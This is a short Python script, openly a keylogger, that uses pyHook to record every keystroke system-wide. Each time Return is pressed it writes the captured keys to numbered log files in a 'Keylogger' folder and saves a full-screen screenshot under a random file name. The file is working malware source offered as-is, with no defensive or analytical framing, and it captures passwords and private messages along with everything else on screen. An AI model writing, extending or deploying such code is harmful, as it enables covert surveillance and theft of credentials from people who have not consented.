import pyHook
import pythoncom
import uuid
from autopy import bitmap
import os

text = ''
count = 1

def key_down(event):
    #print event.Key                        #case sensitive
    global text
    global count
    if event.Key == 'Return':
        #file = open("log.txt",'w')
        #file = open("{}.txt".format(str(uuid.uuid4())),'w')
        if os.path.exists('Keylogger') == False:
            os.mkdir('Keylogger')
        file = open("Keylogger/log" + str(count) + ".txt",'w')
        file.write(text)
        file.close()
        count += 1
        img = bitmap.capture_screen()
        img.save("{}.bmp".format(str(uuid.uuid4())))
    else:
        text += event.Key



hook = pyHook.HookManager()
hook.KeyDown = key_down                     #case sensitive
hook.HookKeyboard()                         #bisa mouse juga
pythoncom.PumpMessages()

